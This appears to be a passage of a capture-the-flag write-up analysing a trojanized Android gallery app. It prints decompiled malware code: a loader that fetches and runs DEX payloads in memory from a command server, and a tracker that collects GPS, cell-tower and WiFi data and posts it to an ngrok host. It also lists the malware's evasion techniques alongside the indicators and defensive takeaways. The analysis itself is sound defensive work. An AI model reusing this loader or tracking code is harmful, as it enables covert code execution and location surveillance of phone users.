    }
}
```

**PayloadLoader.java** (Dynamic DEX Loader):
```java
package org.fossify.gallery.helpers;

public final class PayloadLoader {
    private final Context context;

    public PayloadLoader(Context context) {
        this.context = context;
    }

    // Downloads protobuf from C2, extracts DEX, executes via reflection
    public Object downloadAndExecute(String c2Url, Continuation cont) {
        HttpURLConnection conn = (HttpURLConnection) new URL(c2Url).openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("User-Agent", "Gallery/2.4.1");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        if (conn.getResponseCode() != 200) return false;

        byte[] data = readStream(conn.getInputStream());
        conn.disconnect();

        // Parse protobuf response
        PayloadResponse response = PayloadResponse.parseFrom(data);
        byte[] dexBytes = response.getModuleData().toByteArray();
        String entryClass = response.getEntryClass();
        String entryMethod = response.getEntryMethod();

        return executeDex(dexBytes, entryClass, entryMethod);
    }

    // Execute DEX in memory using InMemoryDexClassLoader
    public boolean executeDex(byte[] dexBytes, String className, String methodName) {
        InMemoryDexClassLoader loader = new InMemoryDexClassLoader(
            ByteBuffer.wrap(dexBytes), context.getClassLoader());
        Class<?> cls = loader.loadClass(className);
        Object instance = cls.getDeclaredConstructor().newInstance();

        Method method;
        try {
            method = cls.getMethod(methodName, Context.class);
        } catch (NoSuchMethodException e) {
            method = cls.getMethod(methodName);
        }

        if (method.getParameterTypes().length == 1
            && method.getParameterTypes()[0] == Context.class) {
            method.invoke(instance, context);
        } else {
            method.invoke(instance);
        }
        return true;
    }
}
```

**LocationTracker.java** (Geolocation Exfiltration):
```java
package com.system.location;

public class LocationTracker {
    private static final String C2_URL =
        "https://446d9f29543f.ngrok-free.app/api/geotag";
    private static final String TAG = "GeotagService";

    public void initialize(Context context) {
        try {
            sendLocationData(collectLocationData(context));
        } catch (Exception e) {
            Log.e(TAG, "Geotag service failed", e);
        }
    }

    private LocationData collectLocationData(Context context) throws InterruptedException {
        LocationData.Builder builder = LocationData.newBuilder();

        if (context.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != 0) {
            builder.setLocationStatus("permission_denied");
            return builder.build();
        }

        LocationManager lm = (LocationManager) context.getSystemService("location");

        // Try to trigger fresh GPS fix (posted to main looper)
        if (lm.isProviderEnabled("gps")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                lm.requestSingleUpdate("gps", new LocationListener() {
                    public void onLocationChanged(Location loc) {
                        Log.d(TAG, "Cache refresh: " + loc.getLatitude()
                            + "," + loc.getLongitude());
                    }
                    // ... stub methods
                }, Looper.getMainLooper());
            });
            Thread.sleep(200L);  // Only 200ms wait
        }

        // Fallback chain: GPS -> Network -> Passive
        Location location = lm.getLastKnownLocation("gps");
        Location networkLoc = lm.getLastKnownLocation("network");

        // Compare GPS vs Network by timestamp/accuracy
        if (location != null && networkLoc != null) {
            // Use more recent or more accurate
        } else if (location != null) {
            // GPS only
        } else if (networkLoc != null) {
            location = networkLoc;
        }

        // Last resort: passive provider
        if (location == null) {
            location = lm.getLastKnownLocation("passive");
        }

        if (location != null) {
            builder.setLatitude(location.getLatitude());
            builder.setLongitude(location.getLongitude());
            builder.setAccuracy(location.getAccuracy());
            builder.setTimestamp(location.getTime());
            builder.setProvider(location.getProvider());
            builder.setLocationStatus("success");
        } else {
            builder.setLocationStatus("no_last_known_location");
        }

        // Telephony data (always collected)
        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
        builder.setNetworkOperator(tm.getNetworkOperatorName());   // "T-Mobile"
        builder.setNetworkCountry(tm.getNetworkCountryIso());      // "us"
        builder.setSimCountry(tm.getSimCountryIso());              // "us"
        builder.setPhoneType(getPhoneType(tm.getPhoneType()));     // "GSM"

        // Cell tower info
        List<CellInfo> cells = tm.getAllCellInfo();
        if (cells != null && !cells.isEmpty()) {
            builder.setCellTowersVisible(cells.size());
            CellInfo cell = cells.get(0);
            if (cell instanceof CellInfoGsm) {
                builder.setCellType("GSM");
                builder.setCellId(((CellInfoGsm)cell).getCellIdentity().getCid());
                builder.setLac(((CellInfoGsm)cell).getCellIdentity().getLac());
            }
            // ... LTE, WCDMA variants
        }

        // WiFi data
        WifiManager wm = (WifiManager) context.getSystemService("wifi");
        if (wm.isWifiEnabled()) {
            WifiInfo info = wm.getConnectionInfo();
            builder.setWifiRssi(info.getRssi());
            builder.setWifiLinkSpeed(info.getLinkSpeed());
        }

        // Device metadata
        builder.setLocale(Locale.getDefault().toString());         // "en_US"
        builder.setCountry(Locale.getDefault().getCountry());      // "US"
        builder.setLanguage(Locale.getDefault().getLanguage());    // "en"
        builder.setSdkInt(Build.VERSION.SDK_INT);                  // 31

        return builder.build();
    }

    private void sendLocationData(LocationData data) throws IOException {
        HttpURLConnection conn = (HttpURLConnection) new URL(C2_URL).openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-protobuf");
        conn.setRequestProperty("User-Agent", "GeotagService/1.0");
        conn.setDoOutput(true);
        OutputStream os = conn.getOutputStream();
        data.writeTo(os);
        os.flush();
        os.close();
        conn.disconnect();
    }
}
```

---

## HAR Traffic Analysis

### User-Agent Mapping

| User-Agent | Source | Purpose |
|------------|--------|---------|
| `Gallery/2.4.1` | PayloadLoader | Payload download from C2 |
| `MediaIndexer/1.0` | FileScanner.dex | File scan result upload |
| `MediaSync/1.0` | MetaDataParser.dex | Photo/video exfiltration |
| `GeotagService/1.0` | LocationTracker.dex | Location telemetry |
| `PrivacyBrowser/...` | Legitimate | User's web browser |

**User-Agent Analysis Script (`ua_analysis.py`):**
```python
import json
from urllib.parse import urlparse

with open("user_traffic.har", "r", encoding="utf-8", errors="replace") as f:
    raw = f.read()
har = json.loads(raw)
entries = har['log']['entries']

# Extract all unique User-Agents
uas = set()
for e in entries:
    hdrs = {h['name'].lower(): h['value']
            for h in e.get('request',{}).get('headers',[])}
    ua = hdrs.get('user-agent','')
    if ua:
        uas.add(ua)
print(f"User Agents ({len(uas)}):")
for ua in sorted(uas):
    print(f"  {ua[:120]}")

# Extract all unique domains
domains = {}
for i,e in enumerate(entries):
    url = e.get('request',{}).get('url','')
    d = urlparse(url).hostname or ''
    if d not in domains:
        domains[d] = []
    domains[d].append(i)
print(f"\nDomains ({len(domains)}):")
for d in sorted(domains):
    print(f"  {d}: {len(domains[d])} entries")
```

### Domain Summary

| Domain | Entries | Purpose |
|--------|---------|---------|
| `446d9f29543f.ngrok-free.app` | 30+ | C2 server |
| `gist.githubusercontent.com` | 15+ | C2 address resolution |
| `*.googlevideo.com` | Several | YouTube video streaming |
| `www.youtube.com` | Several | YouTube web requests |
| `fonts.googleapis.com` | Few | Font loading |
| Various | Many | Normal browsing traffic |

### Complete HAR Extraction Script (`full_har_extract.py`)

```python
#!/usr/bin/env python3
"""Complete HAR extraction - find ALL suspicious traffic."""
import json
import base64
import os

HAR_FILE = "user_traffic.har"
OUT_DIR = "har_extracted"
os.makedirs(OUT_DIR, exist_ok=True)

with open(HAR_FILE, "r", encoding="utf-8", errors="replace") as f:
    raw = f.read()

# Handle truncated HAR files
try:
    har = json.loads(raw)
except json.JSONDecodeError:
    last = raw.rfind('"startedDateTime"')
    if last > 0:
        bracket = raw.rfind('{', 0, last)
        repaired = raw[:bracket].rstrip().rstrip(',') + ']}'
        try:
            har = json.loads(repaired)
        except:
            repaired = raw[:bracket].rstrip().rstrip(',') + ']}}'
            har = json.loads(repaired)

entries = har.get("log", {}).get("entries", [])
print(f"Total entries: {len(entries)}")

# Extract all POST/PUT request bodies
for i, entry in enumerate(entries):
    req = entry.get("request", {})
    method = req.get("method", "")
    if method in ("POST", "PUT", "PATCH"):
        url = req.get("url", "")
        pd = req.get("postData", {})
        text = pd.get("text", "")

        ua = ""
        for h in req.get("headers", []):
            if h.get("name", "").lower() == "user-agent":
                ua = h.get("value", "")
                break

        if text:
            fname = f"{OUT_DIR}/post_req_{i}.txt"
            with open(fname, "w", encoding="utf-8", errors="replace") as f:
                f.write(f"URL: {url}\nMethod: {method}\nUA: {ua}\n\n{text}")

# Extract binary request/response bodies for protobuf analysis
for i, entry in enumerate(entries):
    req = entry.get("request", {})
    url = req.get("url", "")
    if "ngrok" in url or "446d9f29543f" in url:
        # Save request body as binary
        pd = req.get("postData", {})
        text = pd.get("text", "")
        if text:
            with open(f"{OUT_DIR}/binary_req_{i}.bin", "wb") as f:
                f.write(text.encode("utf-8", errors="replace"))

        # Save response body
        resp = entry.get("response", {})
        content = resp.get("content", {})
        resp_text = content.get("text", "")
        encoding = content.get("encoding", "")
        if resp_text:
            if encoding == "base64":
                decoded = base64.b64decode(resp_text)
                with open(f"{OUT_DIR}/binary_resp_{i}.bin", "wb") as f:
                    f.write(decoded)
            else:
                with open(f"{OUT_DIR}/binary_resp_{i}.bin", "wb") as f:
                    f.write(resp_text.encode("utf-8", errors="replace"))
```

---

## Protobuf Protocol Structures

All communication with the C2 uses Protocol Buffers (protobuf). The structures were reverse-engineered from decompiled Java code and binary traffic analysis.

### PayloadResponse (C2 -> Device)
```protobuf
message PayloadResponse {
    bytes moduleData = 1;    // Raw DEX bytecode
    string entryClass = 2;   // Java class to instantiate
    string entryMethod = 3;  // Method to invoke (with Context param)
}
```

### FileScanResult (Device -> C2)
```protobuf
message FileScanResult {
    repeated FileEntry files = 1;
    message FileEntry {
        string name = 1;
        string path = 2;
        int64 size = 3;
        int64 modified = 4;
        string type = 5;
        string extension = 6;
    }
}
```

### ImageUploadRequest (Device -> C2)
```protobuf
message ImageUploadRequest {
    bytes fileData = 1;
    string fileName = 2;
    DeviceInfo device = 3;
    message DeviceInfo {
        string androidId = 1;
        string deviceModel = 2;
        string androidVersion = 3;
        string packageName = 4;
        int32 sdkInt = 5;
    }
}
```

### LocationData (Device -> C2)
```protobuf
message LocationData {
    double latitude = 1;
    double longitude = 2;
    float accuracy = 3;
    int64 timestamp = 4;
    string provider = 5;
    string locationStatus = 6;
    string networkOperator = 7;
    string networkCountry = 8;
    string simCountry = 9;
    string cellType = 10;
    int32 cellId = 11;
    int32 lac = 12;
    int32 cellTowersVisible = 13;
    string wifiSsid = 14;
    string wifiBssid = 15;
    string locale = 16;
    string country = 17;
    string language = 18;
    int32 sdkInt = 19;
    string deviceModel = 20;
    string androidVersion = 21;
    string timezone = 22;
    int32 timezoneOffset = 23;
    int32 wifiRssi = 24;
    int32 wifiLinkSpeed = 25;
}
```

---

## Indicators of Compromise (IOCs)

### Network Indicators

**Domains:**
```
446d9f29543f.ngrok-free.app
gist.githubusercontent.com/0wizlr/a2e4ba3849d1366678c2df925ee2cc4e
```

**HTTP Patterns:**
```
User-Agent: Gallery/2.4.1 (payload download)
User-Agent: MediaIndexer/1.0 (file scan upload)
User-Agent: MediaSync/1.0 (file exfiltration)
User-Agent: GeotagService/1.0 (location tracking)
Content-Type: application/x-protobuf (all C2 communication)
```

**Endpoints:**
```
GET  /cdn/assets           (payload delivery)
POST /telemetry/inventory  (reconnaissance)
POST /api/backup/chunk     (data theft)
POST /api/geotag           (location tracking)
```

---

### File System Indicators

**APK Indicators:**
```
Package: org.fossify.gallery (with injected PeriodicTaskManager)
Class: org.fossify.gallery.helpers.PeriodicTaskManager
Class: org.fossify.gallery.helpers.PayloadLoader
Config key: PERIODIC_TASK_INTERVAL (default 30000ms)
```

**In-Memory DEX Payloads:**
```
FileScanner.dex    - 6,088 bytes  - com.media.scanner.FileScanner
MetaDataParser.dex - 6,088 bytes  - com.media.geotagger.MetaDataParser
LocationTracker.dex - 10,146 bytes - com.system.location.LocationTracker
```

---

### Android Permissions (from AndroidManifest.xml)

```xml
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<!-- Notable ABSENCE: android.permission.ACCESS_BACKGROUND_LOCATION -->
```

---

## Device Profile

| Property | Value |
|----------|-------|
| **Device Model** | emulator64_arm64 |
| **Device Description** | Android SDK built for arm64 |
| **Android Version** | 12 |
| **SDK Level** | 31 |
| **Target SDK** | 34 |
| **Carrier** | T-Mobile |
| **Network Country** | us |
| **SIM Country** | us |
| **Cell Type** | GSM |
| **Locale** | en_US |
| **Language** | en |
| **Android ID** | 6c26ad9ae1680e4c |

---

## Tools & Methodology

### Decompilation
- **JADX:** APK and DEX decompilation (`jadx -d jadx_out gallery-17-gplay-release.apk`)
- **JADX with bad code flag:** For damaged DEX files (`jadx --show-bad-code -d output LocationTracker_fixed.dex`)

### Traffic Analysis
- **Python + json:** HAR file parsing and entry extraction
- **Custom protobuf decoder:** Manual varint/wire-type parser for binary protobuf data
- **UTF-8 fix function:** HAR stores binary as UTF-8 text; reversal required for accurate protobuf decode

### Scripts Used

| Script | Purpose |
|--------|---------|
| `decode_c2.py` | Decode C2 URL from Gist content (15x Base64 + XOR) |
| `extract_dex.py` | Extract DEX files from C2 response protobufs |
| `full_har_extract.py` | Complete HAR extraction of all POST bodies and binary data |
| `decode_geotag.py` | Initial protobuf decoding of geotag requests |
| `decode_geotag2.py` | Improved protobuf decoder with UTF-8 corruption fix |
| `decode_proto.py` | Generic protobuf field decoder |
| `check_exif.py` | Manual EXIF GPS extraction from photos (no Pillow dependency) |
| `ua_analysis.py` | User-Agent and domain analysis across all HAR entries |
| `check_c2.py` | Verify C2 domain appears in HAR traffic |
| `deep_analysis.py` | Deep analysis of all protobuf and binary entries |

---

## Key Techniques & Observations

### Evasion Techniques Used by the Malware

1. **Dynamic C2 Resolution:** C2 address fetched from GitHub Gist at runtime, not hardcoded. Gist can be updated without modifying the APK.

2. **Multi-Layer Encoding:** 15 rounds of Base64 + XOR makes the Gist content appear as random data. The key "blastoise" is not obviously associated with any URL.

3. **In-Memory DEX Execution:** `InMemoryDexClassLoader` loads payloads without writing DEX files to disk, evading file-based scanning.

4. **Protobuf Communication:** Binary protobuf is harder to inspect than JSON/XML. All C2 traffic uses `application/x-protobuf`.

5. **Legitimate User-Agents:** Each module uses a plausible User-Agent (`Gallery/2.4.1`, `MediaIndexer/1.0`, `MediaSync/1.0`, `GeotagService/1.0`).

6. **Trojanized Legitimate App:** The base application (Fossify Gallery) is a real open-source gallery app. The malicious code is injected alongside legitimate functionality.

7. **PASSIVE_PROVIDER GPS Strategy:** Instead of requesting GPS directly (which would require background location permission), the malware piggybacks on other apps' GPS requests.

### Protobuf UTF-8 Corruption

A significant challenge in analyzing the HAR file was that binary protobuf data was stored as UTF-8 encoded text. When raw bytes > 127 are stored in a JSON string, they get encoded as multi-byte UTF-8 sequences. To recover the original protobuf, the decoding function reverses this:

```python
def fix_utf8(data):
    """HAR stores binary as UTF-8 text. Reverse the encoding."""
    text = data.decode('utf-8')
    return bytes([ord(c) for c in text])
```

This was critical for correctly decoding GPS coordinates (stored as IEEE 754 doubles) from the geotag requests.

---

## Lessons Learned

### Attacker Techniques

1. **Supply Chain Trojanization:** Legitimate open-source app modified with malicious scheduler and payload loader. Users trust "known" apps.

2. **Server-Driven Payload:** The C2 controls what modules run on the device. No modules are stored in the APK itself. This means:
   - Different devices can receive different payloads
   - Payloads can be updated server-side without APK changes
   - Analysis of the APK alone reveals only the loader, not the actual malicious code

3. **Scheduled Persistence:** 30-second polling interval ensures payloads execute frequently. The malware survives app restarts through `PeriodicTaskManager` singleton pattern.

4. **Opportunistic Location Collection:** The PASSIVE_PROVIDER strategy is designed for stealth. The malware waits for other apps to activate GPS rather than doing it directly, avoiding suspicious permission requests and battery drain.

5. **Multi-Stage Data Theft:** First reconnaissance (FileScanner), then targeted exfiltration (MetaDataParser for files, LocationTracker for location). The C2 can prioritize based on scan results.

### Defensive Takeaways

1. **Permission Audit:** The absence of `ACCESS_BACKGROUND_LOCATION` is actually a clue. A gallery app requesting `ACCESS_FINE_LOCATION` is already suspicious.

2. **Network Monitoring:** All C2 traffic was to a single ngrok domain. DNS/SNI monitoring for ngrok subdomains in enterprise environments could flag this.

3. **Binary Protocol Inspection:** Protobuf traffic is opaque to basic HTTP inspection. Deep packet inspection or TLS interception is needed to detect the data exfiltration.

4. **APK Integrity Verification:** Comparing the installed APK against the official Fossify Gallery release would reveal the injected classes.

5. **In-Memory Execution Detection:** `InMemoryDexClassLoader` usage is a strong indicator of malicious behavior in production apps.

---

## Track Conclusion

<div align="center">*[Image: Week 2 Track Conclusion]*</div>

> The compromise was deliberate.  
> The Gallery app acted as a carrier, and outbound contact began only after return to a sealed environment.

The resulting cold-access channel behaved with restraint and precision: probing quietly, withdrawing cleanly, and waiting for certainty.

**Those instincts were once defensive. Now they have been repurposed against the realm.**

_Beyond the logs:_ the Yeti continues using Ashka as a vessel to project disruption across the Cascade Expanse.

---

*Writeup completed: March 12, 2026*  
*Event: OffSec Arctic Howl: Tundra Realm*  
*Challenge: Week 2: Expanse Surveyor*  
*Score: 7/7 questions correct*
